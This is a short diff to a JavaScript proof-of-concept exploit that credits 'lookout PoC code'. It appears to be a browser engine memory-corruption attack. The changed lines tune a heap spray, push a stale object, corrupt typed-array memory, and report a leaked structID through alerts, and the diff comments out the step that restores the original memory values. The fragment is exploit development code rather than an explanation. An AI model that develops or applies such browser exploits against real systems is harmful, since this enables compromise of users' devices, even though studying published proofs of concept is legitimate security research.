@@ -3,7 +3,7 @@
 // and lookout PoC code.
 
 
- var bufs = new Array(10000);
+ var bufs = new Array(100);
  var stale = 0;
 
 
@@ -14,8 +14,8 @@
  var smsh = new Uint32Array(0x10);
  
  
-var original_val = 0;
-var original_val1 = 0;
+//var original_val = 0;
+//var original_val1 = 0;
  
  var mem0 = 0;
  var mem1 = 0;
@@ -175,8 +175,8 @@ for (var i = 0; i < 0x1000; i++){
 				
                        		
 				//alert("Pushed stale");
-				original_val = bufs[i][k];
-				original_val1 = bufs[i][k+1];
+				//original_val = bufs[i][k];
+				//original_val1 = bufs[i][k+1];
 				
 				bufs.push(stale);
 				stale[0] = fc;
@@ -229,8 +229,8 @@ for (var i = 0; i < 0x1000; i++){
 				}
 				alert('found structID for Uint32Array = '+structID);
 				alert('stale[0] is now: '+stale[0]);
-				bufs[i][k] = original_val;
-				bufs[i][k+1] = original_val1;
+				//bufs[i][k] = original_val;
+				//bufs[i][k+1] = original_val1;
 				
 				sleep(2000);
 				alert("busywaited for 5 seconds");
